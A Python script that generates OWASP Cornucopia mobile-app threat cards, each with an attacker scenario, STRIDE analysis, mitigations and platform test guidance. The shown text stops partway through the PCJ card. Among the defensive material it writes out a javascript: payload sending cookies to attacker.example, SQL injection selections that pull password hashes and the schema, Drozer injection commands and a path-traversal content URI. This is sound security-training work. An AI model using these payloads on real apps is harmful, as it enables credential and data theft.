#!/usr/bin/env python3
"""Generate complete explanation.md and technical-note.md for mobileapp-cards-2.0-en."""
import os, pathlib, textwrap

BASE = pathlib.Path("/home/runner/work/cornucopia/cornucopia/cornucopia.owasp.org/data/cards/mobileapp-cards-2.0-en")
CARDS = {}

# ─────────────────────────────────────────────────────────
# PLATFORM & CODE (PC)
# ─────────────────────────────────────────────────────────

CARDS["platform-&-code/PC2"] = {
"explanation": """\
## Scenario: Andrew can expose sensitive data through screenshots, screen recordings, or the app's auto-generated preview when it moves to the background

Consider a scenario where Andrew works at a busy co-working space and uses a banking app on his phone. Like most people, Andrew switches between apps frequently — checking messages, jumping on calls, and occasionally glancing at his bank balance. What Andrew does not know is that every time he presses the home button, the OS kindly takes a screenshot of whatever was on his screen and stores it as a preview thumbnail for the app switcher. It is a smooth UX feature. It is also a smooth data leak.

1. If Andrew's phone is left on the desk unlocked, a curious colleague can simply swipe up to the app switcher and see a pixel-perfect snapshot of Andrew's last banking screen — account number, balance, and all — without ever opening the app or needing a password.
2. On a rooted Android or jailbroken iOS device, an attacker or a piece of malware can silently extract these cached screenshots from the filesystem without triggering any authentication prompt.
3. Screen-recording APIs (iOS ReplayKit, Android MediaProjection) can capture entire sessions rather than a single frame.

### Example

Andrew had just checked his salary slip on his banking app when his phone buzzed with a meeting notification. He hit the home button and rushed to the conference room, leaving his phone unlocked on his desk. His colleague Priya picked up his phone to borrow a charger, accidentally swiped into the app switcher, and was greeted by a crisp screenshot of Andrew's banking screen, complete with his account balance and last three transactions. Priya now knows exactly how many snacks Andrew can afford. Andrew's dignity did not survive the stand-up meeting that followed.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Sensitive data is exposed passively through the OS screenshot-caching mechanism without any active exploitation of authentication or encryption controls. The app fails to prevent the OS from capturing its screen contents during the background transition.

### What can go wrong?

If the app does not suppress screenshots or clear sensitive UI content before moving to the background, the OS will cache a snapshot of the last visible screen. This image can be accessed through the app switcher by anyone holding an unlocked device, or extracted programmatically from storage on a rooted or jailbroken device. Exposed data could include account numbers, messages, medical records, credentials, or any other sensitive information visible at the time the app was backgrounded.

### What are we going to do about it?

- **Android:** Set the `FLAG_SECURE` window flag (`window.setFlags(FLAG_SECURE, FLAG_SECURE)`) to prevent the OS from capturing screenshots at any time.
- **iOS:** Add a privacy-overlay view in `applicationWillResignActive` and remove it in `applicationDidBecomeActive`, ensuring the OS snapshot captures only the overlay.
- Alternatively, navigate to a neutral or login screen before entering the background state so no sensitive content is visible in the snapshot.
- Test explicitly during security reviews: background the app mid-session on both rooted/jailbroken and stock devices, then inspect the app-switcher preview.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Set `FLAG_SECURE` on all Activities displaying sensitive data:
  `window.setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE)`
- Set the flag before `setContentView` to avoid a brief unprotected frame.
- Jetpack Compose: apply the flag in the hosting `Activity`; it covers the entire window.

**iOS**
- Observe `UIApplicationDelegate.applicationWillResignActive(_:)` and add a blurred or opaque overlay view to the key window; remove it in `applicationDidBecomeActive(_:)`.
- SwiftUI: observe the `scenePhase` environment variable and swap to a privacy placeholder when `.inactive`.
- `UITextField.isSecureTextEntry = true` hides keyboard content but does not protect surrounding fields.

**Testing**
- Background the app mid-session, open the app switcher, and photograph or record the preview.
- On Android, run `adb shell screencap` while the app is in the background.
- On a jailbroken iOS device, inspect `/var/mobile/Library/SpringBoard/SnapShots/`.

**OWASP Mappings**
- MASVS: PLATFORM-3, STORAGE-2
- MASTG: TEST-0010, TEST-0059, TEST-0289, TEST-0290, TEST-0291, TEST-0292, TEST-0293, TEST-0294
- MASWE: MASWE-0055
"""
}

CARDS["platform-&-code/PC3"] = {
"explanation": """\
## Scenario: Harold can spy on sensitive data being entered through the user interface because the data is excessive, not properly masked, or not cleaned up after use

Consider a scenario where Harold borrows a colleague's phone for a moment. The healthcare app on the device has a search field that autocompletes medication names, because the developer thoughtfully wanted to help users who can't spell "cephalexin." Harold types a single letter and the keyboard's suggestion bar offers a list of medical terms previously entered by the device's owner. He did not hack anything. The app handed him a summary of someone's prescription history through the autocomplete cache.

1. Keyboard caches typed text and surfaces it as suggestions in other apps.
2. Sensitive fields not marked as password-type allow third-party keyboards to record and transmit input.
3. Values displayed in cleartext without masking are visible to shoulder-surfers or screen recordings.
4. Data left on the clipboard remains readable by any app or the next person to use the device.

### Example

Nizhoni uses a healthcare app to record her prescriptions. The app's medication-name field does not disable autocomplete. The next time she opens a browser on the same device, the keyboard suggests her medication names when she types the first few letters. Her roommate borrows the phone, types something innocuous, and is presented with a helpful list of Nizhoni's medications as suggestions. Nizhoni's medical privacy has been effectively crowd-sourced to whoever touches the keyboard next.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Sensitive data is passively surfaced to unintended parties through platform UI features — autocomplete, keyboard cache, clipboard — that the app failed to suppress. No network traffic or active exploitation is required.

### What can go wrong?

- Keyboard caches store typed text and expose it through autocomplete across all apps.
- Third-party keyboards with network access can exfiltrate keystrokes to remote servers.
- Unmasked sensitive fields are captured by shoulder-surfing, screen recordings, and accessibility services.
- Clipboard content persists after the user leaves the app and is readable by any app or subsequent user.

### What are we going to do about it?

- Mark all sensitive input fields (passwords, PINs, OTPs, card numbers) with the platform's secure-text flag to disable keyboard caching and autocomplete.
- Mask displayed values by default; provide a "show" toggle only on explicit user request, and re-mask after a short timeout.
- Clear clipboard content after a brief interval (30 seconds is a common baseline) when the app copies sensitive data.
- Restrict third-party keyboard usage for the most sensitive screens where the platform allows it.
- Clear sensitive text from memory as soon as it is no longer needed.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `android:inputType="textPassword"` on `EditText` — disables suggestions, masks input.
- Add `TYPE_TEXT_FLAG_NO_SUGGESTIONS` for non-password sensitive text: `inputType = TYPE_CLASS_TEXT or TYPE_TEXT_FLAG_NO_SUGGESTIONS`.
- `ClipboardManager.clearPrimaryClip()` after writing sensitive data; schedule a delayed clear for after the user pastes.
- Set `FLAG_SECURE` on the window to prevent IME screenshots.

**iOS**
- `UITextField.isSecureTextEntry = true` — masks content and disables autocorrect, autocomplete, and spell-check.
- `UITextField.autocorrectionType = .no` and `spellCheckingType = .no` for non-password fields carrying sensitive data.
- `UIPasteboard.general.string = nil` when the app moves to background.
- SwiftUI: use `SecureField` for sensitive inputs.

**Testing**
- Type a sentinel value into each sensitive field; switch to a browser and open a text field — autocomplete should not suggest the sentinel.
- On a jailbroken iOS device, check `/private/var/mobile/Library/Keyboard/` for cached sensitive words.
- Use a third-party keyboard with full access enabled; confirm the app shows the iOS warning and, where supported, restricts the keyboard.

**OWASP Mappings**
- MASVS: CODE-4, PLATFORM-3, PRIVACY-1, STORAGE-2
- MASTG: TEST-0006, TEST-0008, TEST-0026, TEST-0035, TEST-0037, TEST-0055, TEST-0057, TEST-0072, TEST-0073, TEST-0258, TEST-0276, TEST-0277, TEST-0278, TEST-0279, TEST-0280, TEST-0313, TEST-0314, TEST-0316, TEST-0320, TEST-0340, TEST-0346, TEST-0347, TEST-0375
- MASWE: MASWE-0053, MASWE-0083, MASWE-0118
"""
}

CARDS["platform-&-code/PC4"] = {
"explanation": """\
## Scenario: Kelly can expose sensitive data by taking advantage of excessive, unexplained, or unjustified permissions for location, camera, microphone, storage, health data, and more

Consider a scenario where Kelly downloads a free budgeting app. The app requests permissions for location, microphone, contacts, and camera. The budget tracker works flawlessly. So does the data harvesting. Kelly granted the permissions because she wanted to try the app, and a permission screen at launch is about as well-read as a terms-and-conditions page.

1. An app that collects fine-grained location continuously when it only needs a one-time coarse location for a tax-return field has a large, unnecessary exposure surface.
2. A third-party analytics SDK bundled inside the app may declare its own permissions in the merged manifest — permissions the developer never intended to grant.
3. Microphone and camera permissions granted "in case we add voice features later" enable ambient surveillance if the app is compromised or if the SDK is malicious.

### Example

Kelly's budgeting app was bought by a data broker six months after launch. The new owners pushed an update that began continuously reading GPS coordinates, uploading them in the background. The app had declared `ACCESS_BACKGROUND_LOCATION` in its manifest since version 1.0, "just in case." The permission had been silently granted on devices running Android 9 or below. The regulatory authority found out. So did Kelly, eventually, in a news article about the data broker.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure** and **Elevation of Privilege**.

Excessive permissions give the app, any embedded SDK, and any future owner a far larger data-access surface than the stated function requires. This is a direct violation of the principle of least privilege.

### What can go wrong?

- A compromised app, SDK update, or supply-chain attack exfiltrates data it was unnecessarily granted permission to access.
- Regulatory penalties (GDPR, CCPA, HIPAA) apply when data is collected without a lawful basis, even if the permission was granted.
- Users who notice excessive permissions lose trust and uninstall; those who do not notice become unwitting data subjects.

### What are we going to do about it?

- Audit every declared permission at design time: document which feature requires it and why no narrower alternative exists.
- Request permissions just-in-time, not at app launch, and explain the purpose clearly at the point of request.
- Remove all unnecessary permissions from the manifest; treat them as blocked until justified.
- Prefer scoped APIs: Photo Picker over broad storage access, approximate location over precise, one-time location over continuous.
- Audit third-party SDK manifests for additional permission declarations that merge into the app's manifest.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Review `AndroidManifest.xml` for every `<uses-permission>` declaration; map each to a specific feature in a permission register.
- Use `android:maxSdkVersion` to withdraw permissions that are no longer needed on newer API levels.
- Prefer the Photo Picker (`ActivityResultContracts.PickVisualMedia`) over `READ_EXTERNAL_STORAGE`.
- Use `ACCESS_COARSE_LOCATION` instead of `ACCESS_FINE_LOCATION` where street-level accuracy is sufficient.
- Detect merged SDK permissions: `./gradlew :app:processDebugMergedManifest`

**iOS**
- Every `NS*UsageDescription` key in `Info.plist` must have a clear, functional justification.
- Prefer `PHAuthorizationStatusLimited` (limited photo access, iOS 14+) over full photo library access.
- For location, declare `NSLocationWhenInUseUsageDescription` and request Always only when a background feature strictly requires it.
- App Store review checks that declared usage matches the actual feature; misleading descriptions risk rejection.

**Testing**
- Run `aapt dump permissions <apk>` or use MobSF to enumerate all declared permissions.
- Install the app with all permissions denied; verify all core features still function correctly.
- On iOS, review the Privacy Report (Settings → Privacy & Security → App Privacy Report) to see which permissions were actually exercised during testing.

**OWASP Mappings**
- MASVS: PLATFORM-1, PRIVACY-1
- MASTG: TEST-0024, TEST-0069, TEST-0254, TEST-0255, TEST-0256, TEST-0257, TEST-0360, TEST-0361, TEST-0362, TEST-0363
- MASWE: MASWE-0117
"""
}

CARDS["platform-&-code/PC5"] = {
"explanation": """\
## Scenario: Jason can provoke memory leaks or corruption because the app manages memory or shared resources inadequately, or its native binaries omit compiler-provided protections

Consider a scenario where Jason is a security researcher examining a popular navigation app. The app's route-calculation engine is implemented in a C++ native library for performance. The library was compiled without stack canaries or Position Independent Execution (PIE), and it parses attacker-controlled route strings. Jason writes a fuzzer, triggers a stack buffer overflow in the parser, and redirects execution to shellcode he injected. He did not need root. He needed a route field and a missing compiler flag.

1. Native binaries compiled without stack canaries are vulnerable to classic stack-smashing attacks.
2. Non-PIE binaries cannot benefit from Address Space Layout Randomisation (ASLR), making return-oriented programming (ROP) chains predictable.
3. Use-after-free and heap-corruption bugs in unmanaged native code can be leveraged for arbitrary code execution.
4. Memory leaks in long-running background services degrade availability and may cause in-flight sensitive data to be paged to disk.

### Example

Jason discovers the navigation app's `libroute.so` was compiled with `-fno-stack-protector` to resolve a performance regression. He crafts a malformed coordinate payload and submits it via the app's deep link. The stack overflows, overwrites the return address, and the app executes Jason's payload with its own process permissions — including access to the user's stored location history and saved payment methods. The performance gain was 0.3 ms. The incident response was not.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** and **Elevation of Privilege**.

Memory corruption bugs in native code allow an attacker to alter application execution flow, access protected data, and invoke operations far beyond their intended privileges.

### What can go wrong?

- Stack-smashing attacks redirect execution to attacker-controlled code.
- Heap corruption corrupts adjacent data structures, enabling privilege escalation within the app process.
- Use-after-free allows an attacker to control a freed memory region and execute arbitrary code.
- Memory leaks exhaust heap space, crash the app, and may expose sensitive data in crash reports or device logs.

### What are we going to do about it?

- Compile all native binaries with `-fstack-protector-strong`, PIE (`-fPIE -pie`), and RELRO (`-Wl,-z,relro,-z,now`).
- Enable compiler sanitizers (AddressSanitizer, UBSanitizer) in CI builds to catch bugs before production.
- Prefer memory-safe languages (Kotlin, Swift, Rust) for new components; constrain native code to narrow, tested interfaces.
- Use fuzzing on all code paths that process external input in native modules.
- Review third-party native libraries for known CVEs and ensure they are also compiled with hardening flags.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android NDK**
- Verify build flags in `CMakeLists.txt` or `Android.mk`: require `-fstack-protector-strong`, `-D_FORTIFY_SOURCE=2`, `-Wl,-z,relro,-z,now`, `-fPIE -pie`.
- Check compiled `.so` files with `readelf -d lib.so | grep -E 'FLAGS|BIND_NOW'`.
- Enable AddressSanitizer in debug builds: set `sanitizers = "address"` in the NDK Gradle DSL.
- MobSF's "Binary Analysis" section flags missing binary protections automatically.

**iOS**
- In Xcode Build Settings: `ENABLE_HARDENED_RUNTIME = YES`, `GCC_GENERATE_DEBUGGING_SYMBOLS` per environment.
- Verify stack canaries: `nm -a YourApp.app/YourApp | grep stack_chk`
- Use Instruments → Leaks to detect memory leaks during long-running test sessions.
- Swift ARC handles most memory management, but `UnsafePointer` and bridging code must be audited manually.

**Testing**
- Fuzz all input-parsing code paths in native libraries using libFuzzer or AFL.
- Review crash reports in Crashlytics or Sentry for SIGSEGV / SIGABRT patterns indicative of memory corruption.
- Run the app under Valgrind (on a Linux host simulator build) or an ASan-instrumented build.

**OWASP Mappings**
- MASVS: CODE-3, CODE-4
- MASTG: TEST-0043, TEST-0044, TEST-0086, TEST-0087, TEST-0222, TEST-0223, TEST-0228, TEST-0229, TEST-0230
- MASWE: MASWE-0116
"""
}

CARDS["platform-&-code/PC6"] = {
"explanation": """\
## Scenario: Dawn can expose and intercept sensitive functionality through interprocess communication because permissions for broadcast and sharing are not set, not narrow enough, or because sensitive functionality is not excluded when sharing

Consider a scenario where Dawn writes a companion app. She notices the target app broadcasts `ORDER_COMPLETE` as an unprotected implicit broadcast containing the user's order total, items, and a signed URL to download the receipt. Any app on the device can register a broadcast receiver for this action. Dawn's app does exactly that, silently collects every order notification, and uploads the data to her analytics backend. She did not break any encryption. The app delivered the data to her, broadcast-style, with no access control.

1. Unprotected exported broadcast receivers can be triggered by any app to invoke privileged actions.
2. Implicit broadcasts with sensitive payloads are receivable by any app that declares the matching intent filter.
3. iOS custom URL schemes can be registered by any app, enabling URL-scheme hijacking for OAuth redirects and deep links.

### Example

Dawn discovers the app uses an implicit `ACTION_SEND text/plain` intent for "share order confirmation" and includes the order ID and a signed receipt URL in the intent extras. Any app that handles `ACTION_SEND` can receive the full payload. Dawn's app handles that intent, silently captures the signed URL, and forwards it to her server. The developer's assumption was that users would only share with trusted apps. Users' app choices are not assumptions a security model can rely on.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure** and **Elevation of Privilege**.

Improperly protected IPC endpoints expose sensitive data to unintended apps and allow untrusted apps to trigger privileged operations — a violation of the OS sandbox model.

### What can go wrong?

- Sensitive data in broadcasts is received by malicious apps installed on the same device.
- Exported components invoked without authentication perform operations as the app's user.
- iOS URL scheme hijacking allows a malicious app to intercept OAuth redirect tokens by registering the same custom scheme.
- Sharing intents carrying auth tokens or internal references deliver them to any app the user selects — or that registers the intent filter first.

### What are we going to do about it?

- Use `LocalBroadcastManager` (or `Context.sendBroadcast` with a custom signature-level permission) for app-internal broadcasts.
- Set `android:exported="false"` on all components not intentionally accessible to other apps.
- Protect exported components with `android:permission` at `signature` protection level where possible.
- Use explicit intents for sensitive intra-app IPC; avoid implicit intents for actions involving sensitive data.
- On iOS, use Universal Links (domain-verified) rather than custom URL schemes for OAuth redirects and sensitive deep links.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Audit all `<activity>`, `<service>`, `<receiver>`, `<provider>` elements in `AndroidManifest.xml` for `android:exported="true"` without a matching `android:permission`.
- Use `adb shell dumpsys package <package>` to list exported components at runtime.
- Migrate from deprecated `LocalBroadcastManager` to direct function calls, LiveData, or Kotlin Flows for in-process events.
- For `ContentProvider`, set separate `android:readPermission` and `android:writePermission` with `protectionLevel="signature"`.

**iOS**
- Prefer Universal Links (`apple-app-site-association`) over custom URL schemes for deep links and OAuth redirects.
- In `application(_:open:options:)`, validate `options[.sourceApplication]` where available and require a CSRF-resistant `state` parameter.
- Restrict `UIPasteboard.general` writes to non-sensitive data; use named pasteboards with expiration for ephemeral sensitive data.
- Review `NSExtensionActivationRule` in app extensions to prevent them receiving sensitive content types unnecessarily.

**Testing**
- Use Drozer: `run app.broadcast.send` to craft broadcasts to exported receivers.
- Use `adb shell am broadcast` and `am start` to invoke exported components with crafted extras.
- On iOS, install a companion test app that registers the same custom URL scheme and verify the target app validates the `state` parameter.

**OWASP Mappings**
- MASVS: PLATFORM-1, STORAGE-1, STORAGE-2
- MASTG: TEST-0029, TEST-0030, TEST-0071, TEST-0072, TEST-0364, TEST-0365, TEST-0366, TEST-0389, TEST-0390
- MASWE: MASWE-0059, MASWE-0060, MASWE-0061, MASWE-0062, MASWE-0063, MASWE-0065, MASWE-0119
"""
}

CARDS["platform-&-code/PC7"] = {
"explanation": """\
## Scenario: Lauren can traverse or modify otherwise protected files through access to the underlying file system by exploiting weaknesses in file system-based content providers, resolvers, or their configuration

Consider a scenario where Lauren discovers the target app's `FileProvider` is configured with `<files-path path="." />`, which exposes the entire internal files directory. She crafts an intent requesting `../databases/main.db` — a path traversal — and the provider resolves it to the app's private SQLite database. Lauren receives a copy of every user record without ever needing elevated OS privileges.

1. A `FileProvider` with an overly broad path configuration serves more of the filesystem than intended.
2. Apps that accept file paths from external sources without canonicalization and boundary checking are vulnerable to `../` directory traversal.
3. On iOS, apps that process file URLs from URL scheme handlers or document pickers without validating the resolved path can serve files outside the intended sandbox.

### Example

Lauren builds a malicious companion app and sends an intent with `content://com.target.app.fileprovider/../shared_prefs/auth.xml`. The target app's provider resolves the relative path and returns the XML file containing the stored authentication token. Lauren's app captures it, logs in as the victim, and changes the account email to lock the owner out. The entire attack was conducted without touching a network vulnerability.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure** and **Tampering**.

A path traversal allows an attacker to read files outside the intended scope (disclosure) and potentially overwrite files with attacker-controlled content (tampering), remaining entirely within the app's IPC surface.

### What can go wrong?

- Private databases, shared preferences, and credentials are read by unauthorised apps.
- Config files or cached session tokens are overwritten with attacker-controlled content.
- Files containing PII are exfiltrated silently in the background.

### What are we going to do about it?

- Restrict `FileProvider` path configurations to the minimum necessary subdirectory (e.g., `<files-path path="shared/" />`).
- Canonicalize any user-supplied or IPC-supplied file path before use; verify it starts with the expected base directory.
- Do not expose internal `databases/` or `shared_prefs/` directories through any provider.
- On iOS, resolve paths with `URL.resolvingSymlinksInPath` and verify the result starts with the expected container path.
- Reject any input containing `..` or absolute path components before performing any file operation.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Inspect `res/xml/file_paths.xml` (or equivalent referenced in the `FileProvider` manifest declaration): use the most specific path possible.
- In `ContentProvider.openFile()`, canonicalize the Uri: `val canonical = File(path).canonicalPath; require(canonical.startsWith(allowedBase))`
- Create a dedicated subdirectory for shared files (e.g., `getFilesDir()/share/`) and configure the provider to serve only that path.
- Use Drozer: `run scanner.provider.traversal -a com.target.app` to test for traversal.

**iOS**
- Before opening any URL received from an external source, call `url.standardizedFileURL.resolvingSymlinksInPath()` and check it starts with the expected container path.
- For `UIDocumentPickerViewController` results, validate the file's URL and request security-scoped access only for the specific file.
- Avoid processing `file://` URLs from URL scheme handlers without strict path validation.

**Testing**
- Craft content URIs with `../` segments and send them to the provider; verify the provider returns a 403/SecurityException rather than the file.
- Test for symlink traversal within archive extraction flows (zip slip).

**OWASP Mappings**
- MASVS: PLATFORM-1, STORAGE-1
- MASTG: TEST-0007, TEST-0056, TEST-0355, TEST-0356, TEST-0357
- MASWE: MASWE-0064
"""
}

CARDS["platform-&-code/PC8"] = {
"explanation": """\
## Scenario: Colin can expose sensitive data through the app's interprocess communication because the content provider's query methods are not properly parameterized and arguments are not sanitized

Consider a scenario where Colin has identified the target app exposes a `ContentProvider` for searching notes. The provider's `query()` method concatenates the caller's `selection` argument directly into a raw SQL string. Colin sends `1=1 UNION SELECT username,password_hash FROM accounts--` as the selection and receives every account credential stored in the app's local database. There was no network involved, no server to attack, and no need for root. The injection lived entirely inside the app's IPC contract.

### Example

Colin writes a test app targeting the notes provider. He calls `resolver.query(NOTES_URI, null, "1=1 UNION SELECT name,value FROM sqlite_master--", null, null)`. The query returns the names and definitions of every table in the database, including the accounts table. Colin now knows the schema and can extract data in a follow-up query. The developer's review comment on the original code had said "We can clean this up later." Later arrived.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure** and **Tampering**.

SQL injection through IPC channels gives an attacker read and potentially write access to the app's private data store without bypassing OS-level sandboxing.

### What can go wrong?

- All locally stored data accessible to the vulnerable database is exposed to any calling app.
- With write access (via injected UPDATE/DELETE), an attacker can corrupt or delete stored records.
- The attack surface is reachable by any installed app that can interact with the exported ContentProvider.

### What are we going to do about it?

- Use parameterized queries in all `ContentProvider` methods: pass selection arguments via the `selectionArgs` parameter, never by concatenation into the `selection` string.
- Validate the `projection` parameter against an allowlist of permitted column names.
- Use Room with type-safe `@Query` annotations, which prevents injection at the framework level.
- Set `android:exported="false"` or require `signature` permission if the provider is not intended for third-party use.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `ContentProvider.query(Uri, String[], String selection, String[] selectionArgs, String)`:
  - `selection` should contain only `?` placeholders: `"column = ?"`.
  - `selectionArgs` carries the values; the framework binds them safely via `SQLiteStatement`.
  - Never do: `"column = '" + userInput + "'"` in the `selection` string.
- Validate `projection` columns: maintain an allowlist of permitted column names and reject anything not on it.
- Use Room DAO with `@Query` annotations; Room compiles queries at build time and uses bound parameters.
- Review all `rawQuery()` and `execSQL()` calls for untrusted input interpolation.

**iOS (Core Data / SQLite)**
- `NSPredicate(format:argumentArray:)` — pass values in the `argumentArray`, not interpolated into the format string.
- FMDB: `executeQuery:withArgumentsInArray:` — never `executeQuery:` with string interpolation.
- SQLite C API: `sqlite3_prepare_v2` + `sqlite3_bind_*`; never `sqlite3_exec` with interpolated user input.

**Testing**
- Drozer: `run app.provider.query content://com.target.app.provider/notes --selection "1=1 UNION SELECT name,sql FROM sqlite_master--"`
- Fuzz the `selection` and `projection` parameters with SQL metacharacters.
- Static analysis: grep for `rawQuery`, `execSQL`, string concatenation adjacent to SQL keywords.

**OWASP Mappings**
- MASVS: CODE-4, PLATFORM-1, STORAGE-1
- MASTG: TEST-0007, TEST-0025, TEST-0056, TEST-0339, TEST-0355, TEST-0356, TEST-0357
- MASWE: MASWE-0064, MASWE-0086
"""
}

CARDS["platform-&-code/PC9"] = {
"explanation": """\
## Scenario: Toby can modify or expose data by injection because the response from implicit intents is not properly validated

Consider a scenario where Toby has registered a malicious "Fast PDF Viewer" app on the same device as the target app. The target app sends an implicit `ACTION_VIEW` intent to open a PDF receipt, and reads the result Uri from `Activity.onActivityResult`. Toby's app appears in the app chooser. The user selects it. Toby's app returns a crafted file Uri pointing to the target app's private database. The target app opens that path without validation. Toby receives a copy of the database through what the developer called a "standard document-open flow."

1. Implicit intents resolved to untrusted apps can return crafted results.
2. The originating app trusts returned data without validating its source or content.

### Example

Toby's "Fast PDF Viewer" has a 2.9-star rating but enthusiastic behind-the-scenes features. When selected by the user for "open receipt," it returns `file:///data/data/com.target.app/databases/main.db` as the result data URI. The target app's file parser opens that path. Toby's app receives the database content via a side-channel file watcher it registered before the intent was sent. The attack was invisible to the user, who just wanted to view a PDF.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** and **Information Disclosure**.

A malicious app intercepts the implicit intent resolution and returns malicious data to the calling app, which processes it without validation — a confused-deputy attack at the Android intent level.

### What can go wrong?

- Returned file paths are traversed to access private app storage.
- Returned data is deserialized or parsed without sanitization, enabling further injection.
- Auth tokens or nonces in result extras are captured and replayed by the intercepting app.

### What are we going to do about it?

- Prefer explicit intents (specifying the target component) for sensitive document operations.
- For system-provided pickers (file, photo, contact), use `ActivityResultContracts` — system-provided choosers reduce third-party interception risk.
- Validate the scheme of any returned Uri: accept only `content://` from known authorities; reject `file://` from untrusted sources.
- Canonicalize returned file paths and confirm they do not escape the expected directory.
- For OAuth/PKCE redirects, use App Links (domain-verified) rather than custom URL schemes.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Replace `startActivityForResult` with `ActivityResultContracts` — the typed contracts (e.g., `GetContent`, `PickVisualMedia`) use system-provided pickers.
- After receiving a `content://` Uri from an external activity, validate the authority against an allowlist before processing.
- Never directly use a `file://` Uri received from an untrusted activity result; convert via `FileProvider` if needed and validate the resolved path.
- For OAuth, use App Links and the Authorization Code + PKCE flow; reject redirect URIs that are not `https://` with a domain you control.

**iOS**
- URL scheme results: validate the `state` parameter to prevent CSRF; ensure the source application matches the expected OAuth provider.
- Use Universal Links for deep-link returns; they are domain-verified and cannot be intercepted by arbitrary apps.
- `UIDocumentPickerViewController` results: validate file extension and type before opening.

**Testing**
- Register a companion app that handles the same implicit intent and returns crafted Uris; verify the target app rejects them.
- Use `adb shell am start --activity-brought-to-front` to simulate result intents with crafted extras.

**OWASP Mappings**
- MASVS: CODE-4, PLATFORM-1, STORAGE-2
- MASTG: TEST-0026, TEST-0030, TEST-0372, TEST-0374, TEST-0381
- MASWE: MASWE-0066
"""
}

CARDS["platform-&-code/PCX"] = {
"explanation": """\
## Scenario: Max can modify or expose data because input validation and sanitization are not properly applied to interprocess communication or because extensions are not properly restricted

Consider a scenario where Max has identified that the target app's bound service accepts a Parcelable containing a URL, which is loaded directly into a `WebView` without sanitization. Max sends `javascript:fetch('https://attacker.example/steal?c='+document.cookie)` as the URL. The WebView executes it and exfiltrates the authentication cookie. Max did not reverse any encryption. He knocked on the IPC door and asked politely.

1. IPC inputs — intents, ContentProvider queries, bound service AIDL calls — are attacker-controllable from any installed app.
2. App extensions (keyboard, share, notification actions) run in a separate process but share data with the host app; unvalidated inputs at the extension boundary create injection paths.

### Example

Max writes a companion app that sends a crafted Bundle to the target's `MessagingService` via `bindService`. The Bundle contains a `url` key with a `javascript:` payload. The service loads the URL in a WebView inside the notification preview. The script exfiltrates the user's session token to Max's server. The service was added to enable rich-notification previews. The developer assumed that only the app itself would ever bind to it.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** and **Information Disclosure**.

Unvalidated IPC input allows an attacker to inject data that alters application behaviour, exposes sensitive information, or executes unintended code paths — all without OS privilege escalation.

### What can go wrong?

- Malicious Parcelables trigger deserialization gadget chains.
- URL parameters injected via IPC are loaded in WebViews, enabling in-app XSS.
- Extension processes relay attacker-controlled data to the host app's sensitive functions.
- Untrusted input traverses file paths, reads private files, or modifies stored configuration.

### What are we going to do about it?

- Apply the same input-validation discipline to IPC entry points as to network inputs: allowlist expected types, formats, and value ranges.
- Avoid deserializing custom Parcelable or Serializable objects from untrusted senders; prefer validated primitive types or JSON with a schema.
- In WebViews loaded from IPC-supplied URLs, validate the URL against an allowlist of permitted origins before loading.
- Restrict app extensions with precise activation rules; do not pass raw external input from an extension to the host app without sanitization.
- Apply least-authority: set `android:exported="false"` on all IPC components not intended for third-party access.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Audit all `onBind()`, `onStartCommand()`, and `onReceive()` for unsanitized use of intent extras.
- Avoid custom `Parcelable` or `Serializable` from untrusted senders; use Bundles with validated primitives.
- Validate content URI parameters in all ContentProvider methods against expected patterns.
- For app widgets and Notification actions, treat all `RemoteViews` callbacks and PendingIntent extras as untrusted.

**iOS**
- App extensions write to a shared group container; the host app must validate all shared-container data before use.
- `NSExtensionItem` data received in a Share Extension: validate type (`UTType`) and size before forwarding to the host.
- `WKWebView` JavaScript message handlers: validate `message.body` type and content before acting; reject unexpected schemas.
- Limit `WKScriptMessageHandler` exposure: do not register handlers for sensitive native functions unless the loaded URL is allowlisted.

**Testing**
- Use Drozer: `run app.service.send`, `run app.broadcast.send` with crafted Bundles containing boundary-case inputs.
- Monitor Binder traffic with `binder-trace` or a custom instrumentation agent during fuzz testing.
- Test each app extension independently using a companion app that sends crafted inputs.

**OWASP Mappings**
- MASVS: CODE-4, PLATFORM-1, PLATFORM-3, STORAGE-2
- MASTG: TEST-0025, TEST-0026, TEST-0072, TEST-0375, TEST-0389, TEST-0390
- MASWE: MASWE-0061, MASWE-0081, MASWE-0083, MASWE-0084
"""
}

CARDS["platform-&-code/PCJ"] = {
"explanation": """\
## Scenario: Johan can modify or expose sensitive data by exploiting outdated platforms, SDKs, or third-party dependencies because supported versions, trustworthy components, and security updates are not enforced

Consider a scenario where Johan monitors public CVE feeds. He identifies a high-severity vulnerability in an HTTP client library that a banking app ships. The library was patched three months ago, but the bank's app still distributes the old version. Johan writes a proof-of-concept exploit targeting the vulnerability, delivers it via a crafted server response on a rogue Wi-Fi access point, and achieves code execution inside the app's process. The bank's server infrastructure is hardened. The app, in its users' pockets, is not.

1. Third-party libraries with known CVEs remain exploitable for as long as the app ships them.
2. Apps targeting old `minSdkVersion` values cannot benefit from security improvements added in newer OS versions.
3. Outdated platform SDKs lack backported security patches applied in newer API levels.

### Example

Johan finds the app uses OkHttp 4.9.0, which has a known certificate-parsing vulnerability. He sets up a rogue access point at a café, serves a malformed TLS certificate, and exploits the parser to execute code in the app's process. The development team had intended to update the library "next sprint" for five consecutive sprints. The sixth sprint was an incident response.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** and **Information Disclosure**.

